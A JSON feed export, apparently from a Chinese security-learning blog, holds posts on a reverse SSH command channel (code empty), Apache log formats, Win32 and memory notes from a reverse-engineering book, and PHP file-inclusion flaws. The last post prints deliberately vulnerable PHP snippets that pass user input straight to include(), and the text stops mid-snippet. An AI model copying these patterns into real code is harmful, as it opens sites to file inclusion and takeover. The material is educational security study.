/></p>\n<h2 id=\"编写返回命令的ssh\"><a class=\"anchor\" href=\"#编写返回命令的ssh\">#</a> 编写返回命令的 SSH</h2>\n<p>通常情况下，可以使用 SSH 客户端连接 SSH 服务器，但 Windows 本身不一定装有 SSH 服务端，所以我们需要反向将命令从 SSH 服务端发送给 SSH 客户端。（即客户端控制服务端）</p>\n<p><span class=\"label\">Code</span></p>\n<pre><code class=\"language-python\">\n\n</code></pre>\n",
            "tags": [
                "BHP",
                "python"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/22/apache%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%E3%80%90%E8%BD%AC%E3%80%91/",
            "url": "https://self-ferry.github.io/2021/01/22/apache%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%E3%80%90%E8%BD%AC%E3%80%91/",
            "title": "apache访问日志详解【转】",
            "date_published": "2021-01-22T14:37:03.000Z",
            "content_html": "<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p><span class=\"label dergous\">源自：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdG91Y2gtcHJjL3AvMTI3NTYxODkuaHRtbA==\">https://www.cnblogs.com/touch-prc/p/12756189.html</span></span></p>\n<h2 id=\"路径\"><a class=\"anchor\" href=\"#路径\">#</a> 路径</h2>\n<p>windows : 默认或者自定义 Apache 的安装路径 \\logs\\access.log|error.log|install|ssl_request.log</p>\n<p>linux:/usr/local/apache/logs/access_log|error_log</p>\n<h2 id=\"apache访问日志格式\"><a class=\"anchor\" href=\"#apache访问日志格式\">#</a> Apache 访问日志格式</h2>\n<p>192.168.106.128 - - [01/Apr/2020:10:37:19 +0800] &quot;GET /HTTP/1.1&quot; 200 45</p>\n<p>各字段代表的内容如下：</p>\n<p>192.168.106.128   ---------- 远程主机的 ip 地址，表明访问网站的是谁。</p>\n<p>空白 -                       ---------- 为了避免用户的邮箱被垃圾邮件骚扰，就用 - 代替</p>\n<p>空白 -                       ---------- 用于记录浏览者进行身份验证时提供的名字</p>\n<p>[01/Apr/2020:10:37:19 +0800] --------- 请求的时间。时间信息最后的 + 0800 是服务器所在时区未于 UTC 之后的 8 小时</p>\n<p>GET /HTTP/1.1                  ---------- 请求的方法 + 资源 + 协议，该项信息的典型格式是 method resource protocol</p>\n<p>200                          -------- 状态码，即请求是否成功或者遇到了什么问题。200 为成功响应请求，一切正常</p>\n<p>45                           ----------  发送的字节数</p>\n<h2 id=\"配置apache访问日志格式命令及参数\"><a class=\"anchor\" href=\"#配置apache访问日志格式命令及参数\">#</a> 配置 Apache 访问日志格式命令及参数</h2>\n<p>LogFormat 指令：定义格式并为格式指定一个名字</p>\n<p>CustomLog 指令：设置日志文件并指明日志文件所用的格式</p>\n<p>LogFormat &quot;% h % l % u % t&quot;% r&quot;%&gt;s % b&quot; common   定义格式和名字</p>\n<p>CustomLog &quot;logs/access.log&quot; common    普通文件记录</p>\n<table style=\"height: 41px; width: 452px\" border=\"0\">\n<tr>\n<td style=\"text-align: center\">%h</td>\n<td style=\"text-align: center\">%i</td>\n<td style=\"text-align: center\">%t</td>\n<td style=\"text-align: center\">%u</td>\n<td style=\"text-align: center\">%r</td>\n<td style=\"text-align: center\">%b</td>\n<td style=\"text-align: center\">%&gt;s</td>\n</tr>\n<tr>\n<td style=\"text-align: center\">远端主机</td>\n<td style=\"text-align: center\">远端登录名</td>\n<td style=\"text-align: center\">远端用户名</td>\n<td style=\"text-align: center\">时间</td>\n<td style=\"text-align: center\">请求第一行</td>\n<td style=\"text-align: center\">传输字节数</td>\n<td style=\"text-align: center\">状态</td>\n</tr>\n</table>\n<p>LogFormat &quot;%h %l %u %t &quot;%r&quot; %&gt;s %b &quot;%{Referer}i&quot; &quot;%{User-Agent}i&quot;&quot; combined</p>\n<p>CustomLog logs/access_log combined 复合日志记录</p>\n<table border=\"0\" align=\"left\">\n<tr>\n<td>%{Referer}i\\</td>\n<td style=\"text-align: center\">\\\"%{User-Agent}i\\</td>\n</tr>\n<tr>\n<td>请求来源</td>\n<td>客户端浏览器提供的浏览器识别信息</td>\n</tr>\n</table>\n<h2 id=\"apache错误日志格式\"><a class=\"anchor\" href=\"#apache错误日志格式\">#</a> Apache 错误日志格式</h2>\n<p>错误日志无论在格式上还是在内容上都和访问日志不同。错误日志和访问日志一样提供丰富的信息，我们可以利用这些信息分析服务器的运行情况、哪里出现了问题。错误日志记录了服务器运行期间遇到的各种错误，以及一些普通的诊断信息，比如服务器何时启动、何时关闭等。我们可以设置日志文件记录信息级别的高低，控制日志文件记录信息的数量和类型。这是通过 LogLevel 指令设置的，该指令默认设置的级别是 error，即记录称得上错误的事件。有关该指令中允许设置的各种选项的完整清单，请参见 http://www.apache.org/docs/mod/core.html#loglevel 的 Apache 文档。在日志文件中的内容分属两类：文档错误和 CGI 错误。错误日志中偶尔也会出现配置错误，另外还有前面提到的服务器启动和关闭信息。</p>\n<h3 id=\"1文档错误\"><a class=\"anchor\" href=\"#1文档错误\">#</a> （1）文档错误</h3>\n<p>[Fri Mar 30 14:45:09 2018] [error] [client 192.168.115.120]</p>\n<p>user <span class=\"exturl\" data-url=\"bWFpbHRvOmNldmFwaUBzaW5nLmNvbQ==\">cevapi@sing.com</span> : authentication failure for &quot;/cgi-bin/hivpoo/cook.py&quot; : password mismatch</p>\n<ol>\n<li>\n<p>错误发生的日期和时间</p>\n</li>\n<li>\n<p>错误的级别或严重性</p>\n</li>\n<li>\n<p>导致错误的 IP 地址</p>\n</li>\n<li>\n<p>错误信息本身。</p>\n</li>\n</ol>\n<h3 id=\"2cgi错误\"><a class=\"anchor\" href=\"#2cgi错误\">#</a> （2）CGI 错误</h3>\n<p>错误日志最主要的用途或许是诊断行为异常的 CGI 程序。为了进一步分析和处理方便，CGI 程序输出到 STDERR（Standard Error，标准错误设备）的所有内容都将直接进入错误日志。这意味着，任何编写良好的 CGI 程序，如果出现了问题，错误日志就会告诉我们有关问题的详细信息。CGI 程序错误输出到错误日志也有它的缺点，错误日志中将出现许多没有标准格式的内容，这使得用错误日志自动分析程序从中分析出有用的信息变得相当困难。</p>\n",
            "tags": [
                "web",
                "apache"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/20/%E3%80%8A%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/",
            "url": "https://self-ferry.github.io/2021/01/20/%E3%80%8A%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/",
            "title": "《加密与解密》第一章",
            "date_published": "2021-01-20T04:24:48.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=486999662\"]}]'></div></div>\n<h1 id=\"windows操作系统\"><a class=\"anchor\" href=\"#windows操作系统\">#</a> Windows 操作系统</h1>\n<p>本书研究 Windows 平台上的加密与解密，因此要求读者必须对操作系统有所了解。建议读者阅读 Windows 操作系统原理方面的书籍，这对深入理解本书的后续内容很有帮助。</p>\n<h2 id=\"win32-api函数\"><a class=\"anchor\" href=\"#win32-api函数\">#</a> Win32 API 函数</h2>\n<p>现在很多讲程序设计的书都基于 MFC 库和 OWL 库的 Windows 设计，对 Windows 实现细节鲜有讨论，而调试程序是要和系统底层打交道的，所以有必要掌握一些 API 函数的知识。</p>\n<p>对初学者来说，API 函数也许是一个时常耳闻却感觉有些神秘的东西。 API 的英文全称为 &quot;Application Programming Interface&quot; (应用程序编程接口), 要想理解这个定义，需要追溯操作系统的发展历史。 当 Windows 操作系统开始占据主导地位的时候，开发 Windows 平台上的应用程序成为人们的需要。 而在 Windows 程序设计发展的初期，Windows 程序员能够使用的编程工具只有 API 函数。这些函数提供应用程序运行所需要的窗口管理、图形设备接口、内存管理等服务功能。 这些功能以函数库的形式组织在一起，形成了 Windows 应用程序编程接口，简称 &quot;Win API&quot;, Win API 子系统负责将 API 调用转换成 Windows 操作系统的系统服务调用。 所以，可以认为 API 函数是整个 Windows 框架的基石，它的下面是 Windows 操作系统核心，它的上面则是 Windows 应用程序，如图 1.3 所示。 应用程序开发人员看到的 Windows 操作系统实际上就是 Win API, Windows 操作系统的其他部分对开发人员来说是完全透明的。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>用于 16 位 Windows 的 API (Windows 1.0~Windows 3.1) 称作 &quot;Win16&quot;, 用于 32 位 Windows 的 API ( Windows 9x/NT/2000/XP/7/10 ) 称作 &quot;Win32&quot;, 64 位 Windows API 的名称和功能基本没有变化，还是使用 Win32 的函数名，只不过是用 64 位代码实现的。 API 函数调用在从 Win16 到 Win32 的转变中保持兼容，并在数量和功能上不断增强 - Windows 1.0 只支持不到 450 个函数调用，现在已有几千个函数了。</p>\n<p>所有 32 位 Windows 都支持 Win16 API (以确保与旧的应用程序兼容) 和 Win32 API (以运行新的应用程序), 非常有趣的是，Windows NT/2000/xP/7 与 Windows 9x 的工作方式不同。 在 WindowsNT/2000XKP/7 中，Winl6 函数调用通过一个转换层转换为 Win32 函数调用，然后被操作系统处理。在 Windows 9x 中，该操作正好相反，Win32 函数调用通过转换层转换为 Win16 函数调用，再由操作系统进行处理。</p>\n<p>Windows 运转的核心是动态链接。 Windows 提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库 (DLL) 实现。 在 Windows 9x 中，DLL 通常位于 1WINDOWSYSTEM 子目录中。在 Windows NT72000/XP/7 中，DLL 通常位于系统安装目录的 SYSTEM 和 SYSTEM32 子目录中。</p>\n<p>在早期，Windows 的主要部分只需要在 3 个动态链接库中实现，它们分别代表 Windows 的 3 个主要子系统，叫作 Kernel, User 和 GDI。<br />\n- Kerel (由 KERNEL32.DLL 实现): 操作系统核心功能服务，包括进程与线程控制、内存管理、文件访问等。<br />\n- User (由 USER32.DL. 实现): 负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等。<br />\n- GDI (由 GD132.DLL 实现): 图形设备接口，允许程序在屏幕和打印机上显示文本和图形。</p>\n<p>除了上述模块，Windows 提供了其他 DLL 以支持更多的功能，包括对象安全性、注册表操作 (ADVAPI32. DLL)、通用控件 (COMCTL.32.DL)、公共对话框 (COMDLG32. DLL )、用户界面外壳 SHELL32.DLL) 和网络 (NETAPI32. DLL)。</p>\n<p>虽然 Win API 是一个基于 C 语言的接口，但是 Win API 中的函数可以由用不同语言编写的程序调用，因此，我们只要在调用时遵循调用的规范即可。</p>\n<p>Unicode 影响着计算机工业的每个部分，对操作系统和编程语言的影响最大。 NT 系统是使用 Unicode 标准字符集重新开发的，其系统核心完全是用 Unicode 函数工作的。 如果希望调用一个 Windows 函数并向它传递一个 ANSI 字符串，系统会先将 ANSI 字符串转换成 Unicode 字符串，再将 Unicode 字符串传递给操作系统。 相反，如果希望函数返回 ANSI 字符串，系统会先将 Unicode 字符串转换成 ANSI 字符串，然后将结果返回应用程序。 也就是说，在 NT 架构下，Win32 API 能接受 Unicode 和 ASCI 两种字符集，而其内核只能使用 Unicode 字符集。 尽管这些操作对用户来说都是透明的，但字符串的转换需要占用系统资源。</p>\n<p>在 Win32 API 函数字符集中，&quot;A&quot; 表示 ANSI, &quot;W&quot; 表示 Widechars (即 Unicode), 前者就是通常使用的单字节方式；后者是宽字节方式，以便处理双字节字符。 每个以字符串为参数的 Win32 函数在操作系统中都有这两种方式的版本。 例如，在编程时使用 MessageBox 函数，而在 USER32.DLL 中却没有 32 位 MessageBox 函数的人口。 实际上有两个人口，一个名为 &quot;MessageBoxA&quot; ( ANSI 版), 另一个名为 &quot;MessageBoxW&quot; (宽字符版)。 幸运的是，程序员通常不必关心这个问题，只需要在编程时使用 MessageBox 函数，开发工具的编译模块就会根据设置来决定是采用 MessageBoxA 还是 MessageBoxW。</p>\n<p>这里以 MessageBox 函数为例讨论一下。 此函数用于在 USER32.DLL 用户模块中创建和显示信息框，函数原型如下。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>HWND hWnd<span class=\"token punctuation\">,</span>        <span class=\"token comment\">// 父窗口句柄 </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>LPCTSTR IpText<span class=\"token punctuation\">,</span>    <span class=\"token comment\">// 消息框文本地址 </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LPCTSTR IpCaption<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// 消息框标题地址 </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>UINT uType          <span class=\"token comment\">// 消息框样式</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>看一看 Windows 2000 里 MessageBoxA 函数的内部结构，具体如下。</p>\n<pre><code class=\"language-c++\">int MessageBoxA( \nMessageBoxExA &#123;   //调用MessageBoxExA函数 \nMBTоWCSEx()        //将MessageBoxA消息框的主体文字转换成Unicode字符串 \nMBToWCSEx()       //将MessageBoxA消息框标题栏上的文字转换成Unicode字符串 \nMessageBoxExW( )  //调用MessageBoxExw函数 \nHeapFree ( ) //释放内存\n&#125;\n);\n</code></pre>\n<p>这个结果表明，MessageBoxExA 函数其实是一个替换翻译层，用于分配内存，并将 ANSI 字符串转换成 Unicode 字符串，系统最终调用 Unicode 版的 MessageBoxExW 函数执行。 当 Message BoxW 函数返回时，它便释放内存缓存。 在这个过程中，系统必须执行这些额外的转换操作，因此，ANSI 版的应用程序需要更多的内存及更多的 CPU 资源，而 Unicode 版的程序在 NT 架构下的执行效率高了很多。</p>\n<p>Win32 程序大量调用系统提供的 API 函数，而 Win32 平台上的调试器 (例如 ollybg 等) 恰好有针对 API 函数设置断点的强大功能，因此，掌握常见 API 函数的用法会给程序的跟踪调试带来极大的方便 (详细的 Win32 API 参考文档可以从 MSDN 网站获得), 建议读者掌握一定的 Win32 编程知识 (可参考《Windows 程序设计》一书), 这对合理选择 API 函数有很大的帮助。</p>\n<h2 id=\"wow64\"><a class=\"anchor\" href=\"#wow64\">#</a> WOW64</h2>\n<p>wow64 (Windows-on-Windows 64-bit) 是 64 位 Windows 操作系统的子系统，可以使大多数 32 位应用程序在不进行修改的情况下运行在 64 位操作系统上。</p>\n<p>64 位的 Windows, 除了带有 64 位操作系统应有的系统文件，还带有 32 位操作系统应有的系统文件。Windows 的 64 位系统文件都放在一个叫作 &quot;System32&quot; 的文件夹中，\\Windows\\System32 文件夹中包含原生的 64 位映像文件。为了兼容 32 位操作系统，还增加了 \\Windows\\SysWOW64 文件夹，其中存储了 32 位的系统文件。</p>\n<p>64 位应用程序会加载 System32 目录下 64 位的 kernel32.dll, user32.dll 和 ntdll.dll。当 32 位应用程序加载时，wow64 建立 32 位 ntdl.da 所要求的启动环境，将 CPU 模式切换至 32 位，并开始执行 32 位加载器，就如同该进程运行在原生的 32 位系统上一样。wow64 会对 32 位 ntdll.dl 的调用重定向 ntdll.dl (64 位), 而不是发出原生的 32 位系统调用指令。wow64 转换到原生的 64 位模式，捕获与系统调用有关的参数，发出对应的原生 64 位系统调用。当原生的系统调用返回时，wow64 在返回 32 位模式之前将所有输出参数从 64 位转换成 32 位。</p>\n<p>wow64 既不支持 16 位应用程序的执行 (32 位 Windows 支持 16 位应用程序的执行), 也不支持加载 32 位内核模式的设备驱动程序。wow64 进程只能加载 32 位的 DLL, 不能加载原生的 64 位 DLL。类似的，原生的 64 位进程不能加载 32 位的 DLL。</p>\n<h2 id=\"windows消息机制\"><a class=\"anchor\" href=\"#windows消息机制\">#</a> Windows 消息机制</h2>\n<p>Windows 是一个消息 (Message) 驱动式系统。Windows 消息提供在应用程序与应用程序之间、应用程序与 Windows 系统之间进行通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。<br />\nWindows 系统中有两种消息队列：一种是系统消息队列；另一种是应用程序消息队列。计算机的所有输入设备由 Windows 监控。当一个事件发生时，Windows 先将输入的消息放入系统消息队列，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息并发送给相应的窗口函数。一个事件从发生到到达处理它的窗口函数必须经历上述过程。值得注意的是消息的非抢先性，即不论事件的急与缓，总是按到达的先后排队 (一些系统消息除外), 而这可能导致一些外部实时事件得不到及时的处理。</p>\n<p>因为 Windows 本身是由消息驱动的，所以在调试程序时跟踪一个消息会得到相当底层的答案。</p>\n<p>下面将常用的 Windows 消息函数列出，以供参考。<br />\n(1) SendMessage 函数调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。该函数示例如下。</p>\n<pre><code class=\"language-c++\">LRESULT SendMessage ( \nHWND hWnd,         //目的窗口的句柄 \nUINT Msg,           //消息标识符 \nWPARAM wParam,   //消息的WPARAM域 \nLPARAM 1Param //消息的LPARAM域\n&#125; ;\n</code></pre>\n<p>返回值：由具体的消息决定。如果消息投递成功，则返回 &quot;TRUE&quot; (非零)。</p>\n<p>(2) WM-COMMAND 消息当用户从菜单或按钮中选择一条命令或者一个控件时该消息被发送给它的父窗口，或者当一个快捷键被释放时发送，示例如下。Visual C++ 的 WINUSER.H 文件定义，WM_COMMAND 消息所对应的十六进制数是 0111h。</p>\n<pre><code class=\"language-c++\">WM_COMMAND \n    wNotifyCode = HIWORD (WParam);   //通告代码 \n    wID = LOWORD (wParam);   //菜单条目、控件或快捷键的标识符 \n    hwndctl = (HWND) IParam; //按件句柄\n</code></pre>\n<p>返回值：如果应用程序处理这条消息，则返回值为零。</p>\n<p>(3) WM_DESTROY 消息当一个窗口被销毁时发送该消息。该消息的十六进制数是 02h, 没有参数。</p>\n<p>返回值：如果应用程序处理这条消息，则返回值为零。</p>\n<p>(4) WM-GETTEXT 消息应用程序发送一条 WM_GETTEXT 消息，将一个对应窗口的文本复制到一个由呼叫程序提供的缓冲区中，示例如下。WM_GETTEXT 消息的十六进制数是 0Dh。</p>\n<pre><code class=\"language-c++\">WM GETTEXT\n    wParam = (WPARAM) cchTextMax;  //需要复制的字符数\n    lParam = (LPARAM) IpszText;   //接收文本的缓冲区地址\n</code></pre>\n<p>返回值：被复制的字符数。</p>\n<p>(5) wMLQUTT 消息当应用程序调用 PostQuitMessage 函数时，生成 WM-QUIT 消息，示例如下。WM_QUTT 消息的十六进制数是 012h</p>\n<pre><code class=\"language-c++\">WM QUIT\nnExitCode = (int) wParam;//退出代码\n</code></pre>\n<p>返回值：这条消息没有返回值。</p>\n<p>(6) WM_LBUTTONDOWN 消息当光标停在一个窗口的客户区且用户按下鼠标左键时，wMLBUTTONDOWN 消息将被发送，示例如下。如果鼠标动作未被捕获，这条消息将被发送给光标下的窗口；否则，将被发送给已经捕获鼠标动作的窗口。WM_LBUTTONDOWN 消息的十六进制数是 0201h。</p>\n<pre><code class=\"language-c++\">WM LBUTTONDOWN \nfwKeys = wParam;                //key旗标 \nxPos = LOWORD (IParam);  //光标的水平位置 \nyPos = HIWORD (IParam);  //光标的垂直位置\n</code></pre>\n<h2 id=\"虚拟内存\"><a class=\"anchor\" href=\"#虚拟内存\">#</a> 虚拟内存</h2>\n<p>在默认情况下，32 位 Windows 操作系统的地址空间在 4GB 以内。Win32 的平坦内存模式使每个进程都拥有自己的虚拟空间。对 32 位进程来说，这个地址空间是 4CB, 因为 32 位指针拥有 00000000h~FFFFFFFFh 任何值。此时，程序的代码和数据都放在同一地址空间中，不必区分代码段和数据段。</p>\n<p>虚拟内存 (Virtual Memory) 不是真正的内存，它通过映射 (Map) 的方法使可用虚拟地址 ( VirtualAddress ) 达到 4GB, 每个应用程序可以获得 2GB 的虚拟地址，剩下的 2GB 留给操作系统自用。在 Windows NT 中，应用程序甚至可以获得 3GB 的虚拟地址。</p>\n<p>Windows 是一个分时的多任务操作系统，CPU 时间在被分成一个个时间片后分配给不同的程序。在一个时间片里，与这个程序的执行无关的内容不会映射到线性地址中。因此，每个程序都有自己的 4GB 寻址空间，互不干扰。在物理内存中，操作系统和系统 DLL. 代码需要供每个应用程序调用，所以它们在任意时刻必须被映射。用户的 EXE 程序只在自己所属的时间片内被映射，用户 DLL 则有选择地被映射。</p>\n<p>简单地说，虚拟内存的实现方法和过程如下。</p>\n<p>①当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配 2CB 的虚拟地址 (不是内存，只是地址)。</p>\n<p>②虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入物理地址 (注意：虚拟地址与应用程序代码在物理内存中的位置是没有关系的)。</p>\n<p>③如果使用 DLL, DLL 也会被映射到进程的虚拟地址空间中，在需要的时候才会被读入物理内存。</p>\n<p>④其他项目 (数据、堆栈等) 的空间是从物理内存中分配的，并被映射到虚拟地址空间中。</p>\n<p>⑤应用程序通过使用其虚拟地址空间中的地址开始执行。然后，虚拟内存管理器把每次内存访问映射到物理位置。</p>\n<p>看不明白上面的步骤也不要紧，但要明白以下几点。</p>\n<ul>\n<li>应用程序不会直接访问物理地址。</li>\n<li>虚拟内存管理器通过虚拟地址的访问请求来控制所有的物理地址访问。</li>\n<li>每个应用程序都有独立的 4GB 寻址空间，不同应用程序的地址空间是彼此隔离的。</li>\n<li>DLL 程序没有 “私有” 空间，它们总是被映射到其他应用程序的地址空间中，作为其他应用程序的一部分运行。其原因是：如果 DLL 不与其他程序处于同一个地址空间，应用程序就无法调用它。</li>\n</ul>\n<p>使用虚拟内存的好处是：简化了内存的管理，弥补了物理内存的不足，可以防止多任务环境下应用程序之间的冲突。<br />\n64 位 Windows 操作系统提供了 16TB 的有效寻址空间，其中的一半可用于用户模式的应用程序。</p>\n<h1 id=\"反思\"><a class=\"anchor\" href=\"#反思\">#</a> 反思</h1>\n<p>不会的太多了，明天开始还是接着看视频吧。初学者不知道重点在哪。脑壳痛，giao!</p>\n",
            "tags": [
                "加密与解密",
                "win32api",
                "WOW64",
                "windows消息机制",
                "虚拟内存"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/20/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://self-ferry.github.io/2021/01/20/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "web漏洞-文件包含",
            "date_published": "2021-01-20T04:12:47.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"http://music.163.com/#/song?id=33522741\"]}]'></div></div>\n<h1 id=\"文件包含漏洞简介\"><a class=\"anchor\" href=\"#文件包含漏洞简介\">#</a> 文件包含漏洞简介</h1>\n<ol>\n<li>\n<p>什么是文件包含漏洞？<br />\n程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p>\n</li>\n<li>\n<p>文件包含漏洞的成因<br />\n随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为<ins class=\"primary\">变量</ins>，用来进行动态调用，用户可以对<ins class=\"primary\">变量的值可控</ins>而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在 PHP 语言中。</p>\n<ul>\n<li>php 中常见包含文件的函数\n<ul>\n<li>include () 当使用该函数包含文件时，只有代码执行到 include () 函数时才将文件包含进来，发生错误时之给出一个警告，继续<ins class=\"primary\">向下执行</ins>。</li>\n<li>include_once () 功能与 Include () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n<li>require () require () 与 include () 的区别在于 require () 执行如果发生错误，函数会输出错误信息，并<ins class=\"primary\">终止脚本的运行</ins>。</li>\n<li>require_once () 功能与 require () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>文件包含漏洞的分类</p>\n<p>文件包含漏洞可以分为 RFI (远程文件包含) 和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了 allow_url_include。如果开启 了我们就有可能包含远程文件。</p>\n<p>1、本地文件包含 LFI (Local File Include)</p>\n<p>2、远程文件包含 RFI (Remote File Include)（需要 php.ini 中 allow_url_include=on、allow_url_fopen = On）</p>\n<p>在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>\n</li>\n<li>\n<p>文件包含漏洞的危害</p>\n<ul>\n<li>配合文件上传漏洞 GetShell</li>\n<li>可以执行任意脚本代码</li>\n<li>网站源码文件以及配置文件泄露</li>\n<li>远程包含 GetShell</li>\n<li>控制整个网站甚至是服务器</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"常见漏洞环境\"><a class=\"anchor\" href=\"#常见漏洞环境\">#</a> 常见漏洞环境</h1>\n<p>了解这些主要是为了绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td 